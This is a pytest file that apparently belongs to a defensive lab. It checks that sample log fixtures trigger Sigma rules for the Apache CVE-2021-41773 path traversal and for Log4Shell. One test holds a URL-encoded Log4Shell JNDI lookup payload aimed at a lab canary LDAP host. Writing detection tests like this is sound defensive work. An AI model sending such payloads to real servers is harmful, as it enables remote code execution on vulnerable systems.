"""Lab fixtures: shipped log samples must trigger exactly the right rules."""

from __future__ import annotations

from typing import Any

from custos_vulnerum.config import Paths
from custos_vulnerum.detection import load_rule_file, match_events


def _message_events(lines: list[str], logsource: Any) -> list[dict[str, Any]]:
    source = (
        logsource
        if isinstance(logsource, dict)
        else {
            "category": logsource.category,
            "product": logsource.product,
            "service": logsource.service,
        }
    )
    return [
        {
            "timestamp": "2026-09-23T10:00:00+00:00",
            "source": "log",
            "category": source["category"],
            "product": source["product"],
            "service": source["service"],
            "http_method": "",
            "http_path": "",
            "http_user_agent": "",
            "http_body": "",
            "status": None,
            "message": line,
            "container": source["service"],
        }
        for line in lines
    ]


def _read_lines(path: Any) -> list[str]:
    return [line for line in path.read_text(encoding="utf-8").splitlines() if line.strip()]


def _rule(repo_paths: Paths, name: str) -> Any:
    return load_rule_file(repo_paths.sigma / name)


def test_apache_fixture_lines_trigger_traversal_rule(apache_lab: Any, repo_paths: Paths) -> None:
    rule = _rule(repo_paths, "web_cve_2021_41773_apache_path_traversal.yml")
    lines = _read_lines(apache_lab.directory / "fixtures" / "sample_access_log.txt")
    events = _message_events(lines, apache_lab.meta.logsource)
    results = match_events([rule], events)
    matched = [result.event["message"] for result in results]
    assert len(matched) == 2
    assert all("%2e" in line for line in matched)
    assert not any(line.startswith("127.0.0.1 - - [23/Sep/2026:10:00:01") for line in matched)
    assert not any("/manual/" in line for line in matched)


def test_solr_fixture_lines_trigger_log4shell_rule(log4j_lab: Any, repo_paths: Paths) -> None:
    rule = _rule(repo_paths, "web_cve_2021_44228_log4shell_jndi_lookup.yml")
    lines = _read_lines(log4j_lab.directory / "fixtures" / "sample_solr_log.txt")
    events = _message_events(lines, log4j_lab.meta.logsource)
    results = match_events([rule], events)
    matched = [result.event["message"] for result in results]
    assert len(matched) == 1
    assert "jndi:ldap" in matched[0]


def test_canary_fixture_lines_trigger_canary_rule(log4j_lab: Any, repo_paths: Paths) -> None:
    from custos_vulnerum.evidence import CANARY_LOGSOURCE

    rule = _rule(repo_paths, "net_cve_2021_44228_log4shell_jndi_ldap_connection.yml")
    lines = _read_lines(log4j_lab.directory / "fixtures" / "sample_canary_log.txt")
    events = _message_events(lines, CANARY_LOGSOURCE)
    results = match_events([rule], events)
    assert len(results) == 1
    assert "CANARY connection" in results[0].event["message"]


def test_log4shell_rule_matches_encoded_request_path(log4j_lab: Any, repo_paths: Paths) -> None:
    rule = _rule(repo_paths, "web_cve_2021_44228_log4shell_jndi_lookup.yml")
    events = [
        {
            "timestamp": "2026-09-23T10:00:00+00:00",
            "source": "request",
            "category": log4j_lab.meta.logsource.category,
            "product": log4j_lab.meta.logsource.product,
            "service": log4j_lab.meta.logsource.service,
            "http_method": "GET",
            "http_path": "/solr/admin/cores?action=$%7Bjndi:ldap://canary:1389/custos-x%7D",
            "http_user_agent": "custos",
            "http_body": "",
            "status": 200,
            "message": "",
            "container": "",
        }
    ]
    assert match_events([rule], events)
